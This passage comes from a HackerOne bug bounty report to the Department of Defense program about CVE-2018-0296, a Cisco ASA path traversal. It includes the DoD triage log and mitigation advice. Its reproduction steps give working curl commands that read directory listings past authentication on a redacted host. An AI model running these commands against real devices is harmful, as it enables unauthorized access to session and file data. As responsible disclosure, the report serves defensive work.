The attacker can use this to enumerate the ASA VPN web directory structure and exploit privileged access to the system to gain access to session information.\n\nStep-by-step Reproduction Instructions\n\n1. You can exploit with cURL or Burp: \n`curl -vk -m 45 --path-as-is https://████████/+CSCOU+/../+CSCOE+/files/file_list.json`\n2. You can alter the command slightly to pull additional directory information: \n`curl -vk -m 45 --path-as-is https://█████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b` to dig into these privileged directories.\n3. I also pushed a request to repeater to do this in Burp for screenshots.\n\nProduct, Version, and Configuration (If applicable) https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20180606-asaftd https://nvd.nist.gov/vuln/detail/CVE-2018-0296\n\nSuggested Mitigation/Remediation Actions\nUpgrade the ASA software version per the referenced advisory.\n\n## Impact\n\nHigh - This vulnerability allows the attacker to browse files past the authentication and disclose sensitive information.","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":5,"voters":["mik317","domssilva","unsecury","seven6","05bs001"],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5157841,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2019-06-21T12:04:37.761Z","updated_at":"2019-06-21T12:04:37.761Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":438091},"actor":{"username":"ag3nt-j1","cleared":false,"url":"/ag3nt-j1","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"deptofdefense","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5157842,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Greetings,\n\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\n\nThank you for bringing this vulnerability to our attention!\n\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\n\nYou will receive another status update after we have confirmed your report has been resolved by the system owner.
